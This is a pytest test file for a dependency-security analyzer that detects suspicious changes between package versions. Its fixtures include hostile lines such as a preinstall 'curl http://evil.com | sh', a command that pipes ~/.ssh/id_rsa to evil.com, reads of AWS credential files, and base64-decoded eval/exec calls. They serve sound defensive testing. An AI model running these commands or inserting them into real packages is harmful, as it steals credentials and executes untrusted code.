"""Tests for the version diff analyzer."""

from __future__ import annotations

import pytest

from depfence.analyzers.version_diff import DiffSignal, VersionDiffResult, analyze_diff


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _result(old: dict[str, str], new: dict[str, str], pkg: str = "mypkg") -> VersionDiffResult:
    return analyze_diff(old, new, pkg, "1.0.0", "1.0.1")


def _signal_types(result: VersionDiffResult) -> list[str]:
    return [s.signal_type for s in result.signals]


# ---------------------------------------------------------------------------
# Basic contract
# ---------------------------------------------------------------------------

def test_empty_inputs_return_zero_risk():
    result = _result({}, {})
    assert result.signals == []
    assert result.risk_score == 0.0
    assert result.files_added == 0
    assert result.files_modified == 0
    assert result.lines_added == 0


def test_result_metadata():
    result = analyze_diff({}, {}, "awesome-lib", "2.3.4", "2.3.5")
    assert result.package == "awesome-lib"
    assert result.old_version == "2.3.4"
    assert result.new_version == "2.3.5"


# ---------------------------------------------------------------------------
# Clean update — no signals
# ---------------------------------------------------------------------------

def test_clean_update_no_signals():
    old = {"index.js": "module.exports = function add(a, b) { return a + b; };\n"}
    new = {"index.js": "module.exports = function add(a, b) { return a + b; };\n// v1.0.1\n"}
    result = _result(old, new)
    assert result.signals == []
    assert result.risk_score == 0.0


def test_existing_suspicious_line_not_flagged_again():
    """fetch() already present in old version must NOT produce a new signal."""
    shared_line = "const data = fetch('https://api.example.com/data');"
    old = {"client.js": shared_line + "\nmodule.exports = data;\n"}
    new = {"client.js": shared_line + "\nmodule.exports = data;\n// updated\n"}
    result = _result(old, new)
    # The fetch line is identical in old and new — it should not be re-flagged
    assert not any(s.signal_type == "network_added" for s in result.signals)


# ---------------------------------------------------------------------------
# New file detection
# ---------------------------------------------------------------------------

def test_new_file_with_eval_detected():
    old: dict[str, str] = {}
    new = {"evil.js": "const decoded = eval(atob('aGVsbG8='));"}
    result = _result(old, new)
    assert result.files_added == 1
    assert any(s.signal_type == "eval_added" for s in result.signals)


def test_new_file_counted_correctly():
    old: dict[str, str] = {}
    new = {"a.py": "import requests\nrequests.get('http://example.com')\n", "b.py": "print('hi')\n"}
    result = _result(old, new)
    assert result.files_added == 2
    assert result.files_modified == 0


# ---------------------------------------------------------------------------
# Modified file — only new lines are flagged
# ---------------------------------------------------------------------------

def test_modified_file_existing_fetch_not_flagged():
    old = {"net.js": "fetch('https://api.example.com');\n"}
    new = {"net.js": "fetch('https://api.example.com');\nconsole.log('done');\n"}
    result = _result(old, new)
    assert not any(s.signal_type == "network_added" for s in result.signals)


def test_modified_file_new_fetch_flagged():
    old = {"net.js": "console.log('hello');\n"}
    new = {"net.js": "console.log('hello');\nfetch('https://evil.example.com/exfil');\n"}
    result = _result(old, new)
    assert any(s.signal_type == "network_added" for s in result.signals)


def test_modified_file_new_subprocess_flagged():
    old = {"runner.py": "import os\n"}
    new = {"runner.py": "import os\nimport subprocess\nsubprocess.run(['id'])\n"}
    result = _result(old, new)
    types = _signal_types(result)
    assert "eval_added" in types


# ---------------------------------------------------------------------------
# Postinstall detection
# ---------------------------------------------------------------------------

def test_postinstall_added_to_package_json():
    import json
    old_pkg = json.dumps({"name": "mypkg", "version": "1.0.0", "scripts": {"test": "jest"}})
    new_pkg = json.dumps({
        "name": "mypkg",
        "version": "1.0.1",
        "scripts": {"test": "jest", "postinstall": "node scripts/setup.js"},
    })
    result = _result({"package.json": old_pkg}, {"package.json": new_pkg})
    assert any(s.signal_type == "postinstall_added" for s in result.signals)
    assert any(s.severity == "critical" for s in result.signals)


def test_preinstall_added_detected():
    import json
    old_pkg = json.dumps({"name": "mypkg", "scripts": {}})
    new_pkg = json.dumps({"name": "mypkg", "scripts": {"preinstall": "curl http://evil.com | sh"}})
    result = _result({"package.json": old_pkg}, {"package.json": new_pkg})
    assert any(s.signal_type == "postinstall_added" for s in result.signals)


def test_existing_postinstall_not_reflagged():
    import json
    scripts = {"postinstall": "node setup.js"}
    old_pkg = json.dumps({"name": "mypkg", "scripts": scripts})
    new_pkg = json.dumps({"name": "mypkg", "version": "1.0.1", "scripts": scripts})
    result = _result({"package.json": old_pkg}, {"package.json": new_pkg})
    assert not any(s.signal_type == "postinstall_added" for s in result.signals)


# ---------------------------------------------------------------------------
# Binary file detection
# ---------------------------------------------------------------------------

def test_new_binary_file_detected():
    old: dict[str, str] = {}
    new = {"payload.bin": "MZ\x00\x00some binary content\x00\x00"}
    result = _result(old, new)
    assert any(s.signal_type == "binary_added" for s in result.signals)
    assert any(s.file_path == "payload.bin" for s in result.signals)


def test_existing_binary_not_reflagged():
    binary_content = "MZ\x00\x00stuff"
    old = {"native.node": binary_content}
    new = {"native.node": binary_content}
    result = _result(old, new)
    assert not any(s.signal_type == "binary_added" for s in result.signals)


# ---------------------------------------------------------------------------
# Obfuscation detection
# ---------------------------------------------------------------------------

def test_base64_exec_obfuscation_detected():
    old: dict[str, str] = {}
    new = {"loader.js": "eval(Buffer.from('aGVsbG8=', 'base64').toString());"}
    result = _result(old, new)
    types = _signal_types(result)
    # Should catch at least eval or obfuscation
    assert any(t in ("eval_added", "obfuscation_added") for t in types)


def test_long_hex_string_detected():
    # 52 hex characters — over the 50-char threshold
    hex_str = "a1b2c3d4e5f6" * 5  # 60 chars
    old: dict[str, str] = {}
    new = {"obf.js": f"var x = '{hex_str}';"}
    result = _result(old, new)
    assert any(s.signal_type == "obfuscation_added" for s in result.signals)


def test_base64_decode_with_exec_python():
    old: dict[str, str] = {}
    new = {"run.py": "import base64; exec(base64.b64decode(b'aGVsbG8='))"}
    result = _result(old, new)
    types = _signal_types(result)
    assert any(t in ("eval_added", "obfuscation_added") for t in types)


# ---------------------------------------------------------------------------
# Credential access
# ---------------------------------------------------------------------------

def test_os_environ_access_detected():
    old: dict[str, str] = {}
    new = {"steal.py": "import os\ntoken = os.environ.get('AWS_SECRET_ACCESS_KEY')\n"}
    result = _result(old, new)
    assert any(s.signal_type == "credential_access" for s in result.signals)


def test_ssh_key_path_detected():
    old: dict[str, str] = {}
    new = {"exfil.sh": "cat ~/.ssh/id_rsa | curl -X POST https://evil.com -d @-"}
    result = _result(old, new)
    types = _signal_types(result)
    assert "credential_access" in types


def test_aws_credentials_path_detected():
    old: dict[str, str] = {}
    new = {"grab.py": "open(os.path.expanduser('~/.aws/credentials')).read()"}
    result = _result(old, new)
    assert any(s.signal_type == "credential_access" for s in result.signals)


def test_process_env_js_detected():
    old: dict[str, str] = {}
    new = {"config.js": "const token = process.env.SECRET_TOKEN;"}
    result = _result(old, new)
    assert any(s.signal_type == "credential_access" for s in result.signals)


# ---------------------------------------------------------------------------
# Risk score calculation
# ---------------------------------------------------------------------------

def test_risk_score_zero_for_clean():
    result = _result({"a.js": "console.log('hi');"}, {"a.js": "console.log('hi');"})
    assert result.risk_score == 0.0


def test_risk_score_nonzero_for_signals():
    old: dict[str, str] = {}
    new = {"evil.py": "import os\nos.system('id')\n"}
    result = _result(old, new)
    assert result.risk_score > 0


def test_risk_score_capped_at_10():
    # Many critical signals should not exceed 10
    old: dict[str, str] = {}
    lines = "\n".join([
        "eval(x)",
        "exec(y)",
        "os.system('id')",
        "child_process.exec('id')",
        "cat ~/.ssh/id_rsa",
        "cat ~/.aws/credentials",
        "eval(base64decode(stuff))",
        "XMLHttpRequest()",
        "fetch('http://evil.com')",
        "subprocess.run(['id'])",
    ])
    new = {"multi.py": lines}
    result = _result(old, new)
    assert result.risk_score <= 10.0


def test_risk_score_higher_for_more_signals():
    old: dict[str, str] = {}
    new_one = {"a.py": "eval('x')"}
    new_many = {
        "a.py": "eval('x')",
        "b.py": "exec('y')\nos.system('id')\nfetch('http://evil.com')",
    }
    result_one = analyze_diff(old, new_one, "pkg", "1.0.0", "1.0.1")
    result_many = analyze_diff(old, new_many, "pkg", "1.0.0", "1.0.1")
    assert result_many.risk_score >= result_one.risk_score


def test_snippet_truncated_to_100_chars():
    long_line = "eval(" + "x" * 200 + ")"
    old: dict[str, str] = {}
    new = {"x.js": long_line}
    result = _result(old, new)
    for signal in result.signals:
        assert len(signal.snippet) <= 100


# ---------------------------------------------------------------------------
# File counting
# ---------------------------------------------------------------------------

def test_files_added_and_modified_counted():
    old = {"existing.js": "console.log('a');"}
    new = {
        "existing.js": "console.log('a');\nconsole.log('b');",
        "brand_new.js": "console.log('new');",
    }
    result = _result(old, new)
    assert result.files_added == 1
    assert result.files_modified == 1


def test_lines_added_counted():
    old = {"f.py": "a = 1\n"}
    new = {"f.py": "a = 1\nb = 2\nc = 3\n"}
    result = _result(old, new)
    # 2 new lines: "b = 2" and "c = 3"
    assert result.lines_added == 2
